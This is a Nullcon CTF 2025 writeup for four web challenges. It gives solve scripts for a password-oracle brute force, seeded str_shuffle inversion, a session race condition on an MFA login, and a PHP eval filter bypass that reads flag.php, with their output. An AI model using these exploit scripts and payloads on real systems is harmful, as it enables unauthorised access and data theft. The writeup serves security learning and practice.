---
title: "Nullcon CTF 2025 Writeup: Password Oracle Brute Force and Source Disclosure"
date: 2025-09-06
draft: false
description: "Nullcon CTF 2025 writeup: brute forcing grandmas_notes character by character through a password oracle, and pwgen leaking its source via ?source=1."
tags: ["CTF", "Web", "PHP", "Brute Force", "Information Disclosure"]
toc: false
---

<h2>🏆 128/776</h2>

## <span class="text-primary-400">Writeup </span>/ <span class="text-primary-400">Notes</span>

---

### Web

#### grandmas_notes
<details>

```python
#!/usr/bin/env python3
import re
import string
import sys
import requests

BASE_URL = "http://52.59.124.14:5015"
LOGIN_PATH = "/login.php"
USERNAME = "admin"
PHPSESSID = "b1c5b2e1d8b12a530d8bd6f48f6391f3"
CHARSET = string.ascii_letters + string.digits + string.punctuation

HINT_RE = re.compile(r"Invalid password, but you got\s+(\d+)\s+characters?\s+correct!", re.I)

def hint_count(text: str):
    m = HINT_RE.search(text or "")
    return int(m.group(1)) if m else None

def try_pass(session: requests.Session, pwd: str):
    r = session.post(
        BASE_URL + LOGIN_PATH,
        data={"username": USERNAME, "password": pwd},
        headers={
            "User-Agent": "Mozilla/5.0",
            "Referer": BASE_URL + "/index.php",
        },
        timeout=10,
        allow_redirects=True,
    )
    return r.text

def main():
    s = requests.Session()
    s.cookies.set("PHPSESSID", PHPSESSID, domain="52.59.124.14", path="/")

    prefix = ""
    print(f"Target: {BASE_URL+LOGIN_PATH} | user={USERNAME}")

    while True:
        progressed = False
        for ch in CHARSET:
            cand = prefix + ch
            html = try_pass(s, cand)
            cnt = hint_count(html)
            if cnt is None:
                print(f"No hint found. Candidate: '{cand}'. Assuming success or different response.")
                print(f"Derived password so far: '{cand}'")
                return 0
            if cnt > len(prefix):
                prefix += ch
                progressed = True
                print(f"[+] {len(prefix)} correct -> '{prefix}'")
                break
        if not progressed:
            print(f"Done. Derived password: '{prefix}'")
            # One final check
            _ = try_pass(s, prefix)
            return 0

if __name__ == "__main__":
    sys.exit(main())
```

```bash
Target: http://52.59.124.14:5015/login.php | user=admin
[+] 1 correct -> 'Y'
[+] 2 correct -> 'Yz'
[+] 3 correct -> 'YzU'
[+] 4 correct -> 'YzUn'
[+] 5 correct -> 'YzUnh'
[+] 6 correct -> 'YzUnh2'
[+] 7 correct -> 'YzUnh2r'
[+] 8 correct -> 'YzUnh2ru'
[+] 9 correct -> 'YzUnh2ruQ'
[+] 10 correct -> 'YzUnh2ruQi'
[+] 11 correct -> 'YzUnh2ruQix'
[+] 12 correct -> 'YzUnh2ruQix9'
[+] 13 correct -> 'YzUnh2ruQix9m'
[+] 14 correct -> 'YzUnh2ruQix9mB'
[+] 15 correct -> 'YzUnh2ruQix9mBW'
No hint found. Candidate: 'YzUnh2ruQix9mBWv'. Assuming success or different response.
Derived password so far: 'YzUnh2ruQix9mBWv'
```

`ENO{V1b3_C0D1nG_Gr4nDmA_Bu1ld5_InS3cUr3_4PP5!!}`

</details>

#### pwgen
<details>

Nothing on the page or source

Started bruteforcing parameters, got http://52.59.124.14:5003/?source=1
Found `GET` parameter nthpw

```bash
http://52.59.124.14:5003/?nthpw=1

Your password is: '7F6_23Ha8:5E4N3_/e27833D4S5cNaT_1i_O46STLf3r-4AH6133bdTO5p419U0n53Rdc80F4_Lb6_65BSeWb38f86{dGTf4}eE8__SW4Dp86_4f1VNH8H_C10e7L62154'
```

```php
for($i = 0; $i < $shuffle_count; $i++) {
    $password = str_shuffle($FLAG);
}
```

```php
<?php
// Given final password (what the server printed)
$observed = "7F6_23Ha8:5E4N3_/e27833D4S5cNaT_1i_O46STLf3r-4AH6133bdTO5p419U0n53Rdc80F4_Lb6_65BSeWb38f86{dGTf4}eE8__SW4Dp86_4f1VNH8H_C10e7L62154";
$seed     = 0x1337;

// Invert exactly the permutation used by the $iter-th str_shuffle() with the fixed seed
function invert_once(string $cur, int $iter, int $seed): string {
    $n = strlen($cur);

    // Rewind RNG to the start, advance it to the beginning of the $iter-th shuffle
    srand($seed);
    if ($iter > 1) {
        $dummy = str_repeat("A", $n);
        for ($i = 1; $i < $iter; $i++) { $dummy = str_shuffle($dummy); }
    }

    // Build a unique-byte index string 0..n-1 and shuffle it to capture the exact permutation
    $idx = "";
    for ($i = 0; $i < $n; $i++) { $idx .= chr($i); }
    $shuf = str_shuffle($idx); // permutation used in iteration $iter

    // shuf[pos_new] = old_index  =>  previous[old_index] = current[pos_new]
    $prev = str_repeat("\0", $n);
    for ($j = 0; $j < $n; $j++) {
        $old = ord($shuf[$j]);
        $prev[$old] = $cur[$j];
    }
    return $prev;
}

// Try all possible nthpw values, undoing the chain each time
for ($k = 1; $k <= 1000; $k++) {
    $s = $observed;
    for ($it = $k; $it >= 1; $it--) {
        $s = invert_once($s, $it, $seed);
    }
    if (strncmp($s, "ENO{", 4) === 0) {
        echo "Recovered FLAG: $s\n";
        echo "nthpw = $k\n";
        exit;
    }
}

echo "No match found with prefix ENO{ in 1..1000.\n";
```

`ENO{PHP_S33DZ_4R3_N0T_S0_R4ND0M_4FT3R_4LL!!}`

</details>

#### webby
<details>

```html
<!-- user: user1 / password: user1 -->
<!-- user: user2 / password: user2 -->
<!-- user: admin / password: admin -->
<!-- Find me secret here: /?source -->
```

```bash
http://52.59.124.14:5010/?source=1
```

```python
import web
import secrets
import random
import tempfile
import hashlib
import time
import shelve
import bcrypt
from web import form
web.config.debug = False
urls = (
  '/', 'index',
  '/mfa', 'mfa',
  '/flag', 'flag',
  '/logout', 'logout',
)
app = web.application(urls, locals())
render = web.template.render('templates/')
session = web.session.Session(app, web.session.ShelfStore(shelve.open("/tmp/session.shelf")))
FLAG = open("/tmp/flag.txt").read()

def check_user_creds(user,pw):
    users = {
        # Add more users if needed
        'user1': 'user1',
        'user2': 'user2',
        'user3': 'user3',
        'user4': 'user4',
        'admin': 'admin',

    }
    try:
        return users[user] == pw
    except:
        return False

def check_mfa(user):
    users = {
        'user1': False,
        'user2': False,
        'user3': False,
        'user4': False,
        'admin': True,
    }
    try:
        return users[user]
    except:
        return False

login_Form = form.Form(
    form.Textbox("username", description="Username"),
    form.Password("password", description="Password"),
    form.Button("submit", type="submit", description="Login")
)
mfatoken = form.regexp(r"^[a-f0-9]{32}$", 'must match ^[a-f0-9]{32}$')
mfa_Form = form.Form(
    form.Password("token", mfatoken, description="MFA Token"),
    form.Button("submit", type="submit", description="Submit")
)

class index:
    def GET(self):
        try:
            i = web.input()
            if i.source:
                return open(__file__).read()
        except Exception as e:
            pass
        f = login_Form()
        return render.index(f)

    def POST(self):
        f = login_Form()
        if not f.validates():
            session.kill()
            return render.index(f)
        i = web.input()
        if not check_user_creds(i.username, i.password):
            session.kill()
            raise web.seeother('/')
        else:
            session.loggedIn = True
            session.username = i.username
            session._save()

        if check_mfa(session.get("username", None)):
            session.doMFA = True
            session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()
            #session.tokenMFA = "acbd18db4cc2f85cedef654fccc4a4d8"
            session.loggedIn = False
            session._save()
            raise web.seeother("/mfa")
        return render.login(session.get("username",None))

class mfa:
    def GET(self):
        if not session.get("doMFA",False):
            raise web.seeother('/login')
        f = mfa_Form()
        return render.mfa(f)

    def POST(self):
        if not session.get("doMFA", False):
            raise web.seeother('/login')
        f = mfa_Form()
        if not f.validates():
            return render.mfa(f)
        i = web.input()
        if i.token != session.get("tokenMFA",None):
            raise web.seeother("/logout")
        session.loggedIn = True
        session._save()
        raise web.seeother('/flag')

class flag:
    def GET(self):
        if not session.get("loggedIn",False) or not session.get("username",None) == "admin":
            raise web.seeother('/')
        else:
            session.kill()
            return render.flag(FLAG)

class logout:
    def GET(self):
        session.kill()
        raise web.seeother('/')

application = app.wsgifunc()
if __name__ == "__main__":
    app.run()
```

```python
import sys
import time
import threading
import requests

BASE = sys.argv[1]

def spam_flag(sess: requests.Session, stop_event: threading.Event):
    count = 0
    hit = 0
    while not stop_event.is_set():
        try:
            r = sess.get(f"{BASE}/flag", allow_redirects=False, timeout=2)
            count += 1
            if r.status_code == 200:
                hit += 1
                print("[+] FLAG PAGE REACHED! Body:\n", r.text)
                stop_event.set()
                return
        except Exception:
            pass
    print(f"[*] Stopped flag spammer. Sent={count}, 200s={hit}")

def main():
    sess = requests.Session()

    # Prime session cookie
    try:
        sess.get(f"{BASE}/", timeout=2)
    except Exception:
        pass

    stop = threading.Event()
    threads = []

    # Start multiple threads hammering /flag
    for _ in range(8):
        t = threading.Thread(target=spam_flag, args=(sess, stop), daemon=True)
        t.start()
        threads.append(t)

    # Small delay to ensure hammering started
    time.sleep(0.05)

    # Trigger admin login which creates the vulnerable session state
    data = {"username": "admin", "password": "admin", "submit": "Login"}
    try:
        # Do not follow redirects to return immediately
        r = sess.post(f"{BASE}/", data=data, allow_redirects=False, timeout=5)
        print(f"[*] Login POST status: {r.status_code}")
    except Exception as e:
        print("[!] Login request failed:", e)

    # Wait a bit to let threads try to catch the window
    time.sleep(2)
    stop.set()
    for t in threads:
        t.join(timeout=1)

    print("[*] Done. If no success, try increasing threads or running against a threaded server.")

if __name__ == "__main__":
    main()
```

`ENO{W3B_PY_N0t_S0_S3cur3!!}`

</details>

#### slasher
<details>

```bash
http://52.59.124.14:5011/?source
```

```php
include "flag.php";

$output = null;
if(isset($_POST['input']) && is_scalar($_POST['input'])) {
  $input = $_POST['input'];
  $input = htmlentities($input,  ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
  $input = addslashes($input);
  $input = addcslashes($input, '+?<>&v=${}%*:.[]_-0123456789xb `;');
  try {
      $output = eval("$input;");
  } catch (Exception $e) {
      // nope, nothing
  }
}
?>

<?php if($output) { ?>
	<div class="result-title">Your result is:</div>
	<div class="result" id="resultText"><?php echo htmlentities($output); ?></div>
	<div class="actions" style="margin-top:10px">
	  <button id="copyBtn" class="btn btn-secondary" type="button" onclick="copyResult()">Copy result</button>
	</div>
<?php } ?>
```

```php
<?php
$ords = [102,108,97,103,46,112,104,112]; // 'flag.php'
function n_trues($n){return implode(',', array_fill(0,$n,'true'));}
$path_parts=[];foreach($ords as $n){$path_parts[]='chr(count(array('.n_trues($n).')))';}
$path = 'implode(array(' . implode(',', $path_parts) . '))';
// Build: return implode(file(PATH));
echo "return\nimplode(file($path))";
```

Key Observations
- Newlines are not escaped. They act as whitespace between tokens, replacing spaces.
- true, array, count, chr, implode, file, return all consist of allowed letters.
- You can synthesize integers without digits: count(array(true, true, ...)) equals the number of true entries.
- You can synthesize characters from integers: chr(N) returns a 1‑char string.
- You can concatenate strings without . or quotes: implode(array(s1, s2, ...)).

High‑level shape (newlines are significant whitespace):
- return
- implode(file(implode(array(
- chr(count(array(true, true, …)))  // 'f' (102 times true)
- chr(count(array(true, true, …)))  // 'l' (108)
- chr(count(array(true, true, …)))  // 'a' (97)
- chr(count(array(true, true, …)))  // 'g' (103)
- chr(count(array(true, true, …)))  // '.' (46)
- chr(count(array(true, true, …)))  // 'p' (112)
- chr(count(array(true, true, …)))  // 'h' (104)
- chr(count(array(true, true, …)))  // 'p' (112)

```bash
curl -sS -X POST 'http://52.59.124.14:5011/' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode input@lab/payload.txt
```

`ENO{PHP_F1lT3r5_4r3_N0_M4tch_F0r_7h353_7ru3_h4ck3r5!!}`

</details>